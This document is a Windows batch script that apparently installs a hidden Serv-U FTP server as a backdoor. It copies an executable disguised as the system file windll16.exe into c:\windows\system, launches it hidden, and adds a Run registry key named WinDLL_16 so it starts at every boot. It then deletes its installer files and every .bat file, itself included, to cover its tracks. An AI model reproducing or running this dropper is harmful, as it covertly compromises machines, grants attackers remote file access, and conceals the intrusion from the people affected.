@echo off
md c:\windows
md c:\windows\system
copy windll16.exe c:\windows\system
copy serv-u.ini c:\windows\system
copy regmak.exe C:\windows 
del windll16.exe
serv-u.ini
del regmak.exe
c:\windows\system\windll16.exe /h
C:\windows\RegMak.exe HKEY_LOCAL_MACHINE,Software\Microsoft\Windows\CurrentVersion\Run,WinDLL_16,C:\%windir%\system\windll16.exe /h
del *.bat